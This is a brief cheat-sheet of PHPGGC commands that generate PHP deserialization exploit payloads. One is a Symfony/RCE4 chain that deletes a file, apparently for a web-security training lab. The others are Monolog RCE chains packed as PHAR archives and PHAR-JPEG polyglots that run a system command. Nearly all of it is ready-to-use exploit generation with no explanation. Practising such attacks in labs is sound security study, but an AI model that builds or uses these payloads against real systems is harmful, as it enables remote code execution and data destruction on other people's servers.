
## Create RCE for Symfony
```sh
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```
## Creates a PHAR file in the PHAR format and stores it in /tmp/z.phar
Polyglot files can be generated using `--phar-jpeg` (`-pj`). Other options are available (use `-h`).
```sh
./phpggc -p phar -o /tmp/z.phar monolog/rce1 system id
./phpggc -p phar -o /tmp/z.phar monolog/rce1 system id | base64 -w 0
./phpggc -pj /tmp/dummy.jpg -o /tmp/z.zip.phar monolog/rce1 system id
```